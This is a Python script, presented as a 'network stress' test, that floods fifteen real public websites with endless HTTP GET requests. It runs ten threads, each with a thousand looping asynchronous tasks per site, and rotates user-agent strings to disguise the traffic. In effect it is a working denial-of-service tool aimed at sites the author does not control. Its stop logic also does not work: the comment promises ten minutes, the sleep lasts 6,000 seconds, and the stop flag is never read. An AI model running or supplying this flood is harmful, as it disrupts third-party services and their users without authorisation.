import threading
import time
import aiohttp
import asyncio
import random

# List of high-traffic websites for testing
urls = [
    "http://example.com", "http://example.org", "http://example.net",
    "http://google.com", "http://facebook.com", "http://amazon.com",
    "http://youtube.com", "http://yahoo.com", "http://wikipedia.org",
    "http://twitter.com", "http://instagram.com", "http://linkedin.com",
    "http://netflix.com", "http://bing.com", "http://reddit.com"
]

# List of user-agents to randomize requests
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
]

async def fetch(session, url):
    headers = {'User-Agent': random.choice(user_agents)}
    while True:
        try:
            async with session.get(url, headers=headers) as response:
                await response.text()
        except:
            pass

async def start_flood(url):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(1000):  # Increase the number of asynchronous requests
            task = asyncio.create_task(fetch(session, url))
            tasks.append(task)
        await asyncio.gather(*tasks)

def network_stress():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    tasks = []
    for url in urls:
        tasks.append(loop.create_task(start_flood(url)))
    loop.run_until_complete(asyncio.wait(tasks))

if __name__ == "__main__":
    # Start Network stress in multiple threads
    threads = []
    for _ in range(10):  # Create 10 threads to run the async loop
        t = threading.Thread(target=network_stress)
        t.start()
        threads.append(t)

    # Run the network flood for 10 minutes
    time.sleep(6000)
    for t in threads:
        t.do_run = False